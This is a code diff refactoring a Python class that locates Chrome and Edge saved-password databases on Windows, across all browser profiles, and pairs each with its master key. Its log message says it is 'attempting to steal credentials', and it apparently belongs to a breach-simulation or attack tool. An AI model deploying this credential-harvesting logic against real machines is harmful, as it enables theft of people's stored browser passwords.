@@ -97,17 +97,20 @@ def Win32CryptUnprotectData(cipherText, entropy=False):
 DRIVE = "C"
 LOCAL_APPDATA = "{drive}:\\Users\\{user}\\AppData\\Local"
 
+WINDOWS_BROWSERS = {
+    "Chromium Edge": "{local_appdata}\\Microsoft\\Edge\\User Data",
+    "Google Chrome": "{local_appdata}\\Google\\Chrome\\User Data",
+}
+
 
 class WindowsCredentialsDatabaseSelector:
     def __init__(self):
         user = getpass.getuser()
         local_appdata = LOCAL_APPDATA.format(drive=DRIVE, user=user)
 
-        # TODO: decide what to do with this, make constant or inject it?
-        self.browser_paths = [
-            ("Chromium Edge", f"{local_appdata}\\Microsoft\\Edge\\User Data"),
-            ("Google Chrome", f"{local_appdata}\\Google\\Chrome\\User Data"),
-        ]
+        self._browsers = {}
+        for browser_name, browser_directory in WINDOWS_BROWSERS.items():
+            self._browsers[browser_name] = browser_directory.format(local_appdata=local_appdata)
 
     def __call__(self) -> Sequence[PurePath]:
         return self._get_database_dirs()
@@ -118,10 +121,10 @@ class WindowsCredentialsDatabaseSelector:
         """
 
         databases = set()
-        for name, path in self.browser_paths:
-            logger.info(f'Attempting to steal credentials from browser "{name}"')
+        for browser_name, browser_installation_path in self._browsers.items():
+            logger.info(f'Attempting to steal credentials from browser "{browser_name}"')
 
-            local_state_file_path = os.path.join(path, "Local State")
+            local_state_file_path = os.path.join(browser_installation_path, "Local State")
             if os.path.exists(local_state_file_path):
                 master_key = None
 
@@ -129,8 +132,8 @@ class WindowsCredentialsDatabaseSelector:
                 browser_profiles = {"Default", ""}
 
                 # get all additional browser profiles
-                for dirs in os.listdir(path):
-                    dirs_path = os.path.join(path, dirs)
+                for dirs in os.listdir(browser_installation_path):
+                    dirs_path = os.path.join(browser_installation_path, dirs)
                     if os.path.isdir(dirs_path) and dirs.startswith("Profile"):
                         browser_profiles.add(dirs)
 
@@ -170,7 +173,7 @@ class WindowsCredentialsDatabaseSelector:
                 # each user profile has its own password database
                 for profile in browser_profiles:
                     try:
-                        db_files = os.listdir(os.path.join(path, profile))
+                        db_files = os.listdir(os.path.join(browser_installation_path, profile))
                     except Exception as err:
                         logger.error(
                             "Exception encountered while trying to get "
@@ -184,6 +187,8 @@ class WindowsCredentialsDatabaseSelector:
                             # TODO: return pathlib.Path object, not str
                             # TODO: `master_key` is the same for all databases,
                             #       can just return it once
-                            databases.add((os.path.join(path, profile, db), master_key))
+                            databases.add(
+                                (os.path.join(browser_installation_path, profile, db), master_key)
+                            )
 
         return databases
